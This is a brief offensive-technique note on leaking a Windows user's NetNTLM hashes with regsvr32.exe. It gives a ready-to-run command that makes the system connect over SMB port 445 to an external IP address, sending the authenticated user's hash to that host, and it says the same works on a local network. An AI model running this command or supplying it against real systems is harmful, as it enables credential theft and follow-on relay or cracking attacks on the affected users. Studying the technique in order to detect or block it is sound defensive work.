Leaking NetNTLM Hashes Over The Internet
========================================

The regsvr32.exe can be used to leak the authenticated user NetNTLM hashes by making a request to port 445 to arbitrary IP address.

```sh
regsvr32 /s /u /i://35.164.153.224/@something scrobj.dll
```

Where 35.164.153.224 is the IP address to connect to.

The same technique can be used to leak the NetNTLM hashesh on a local network as well.
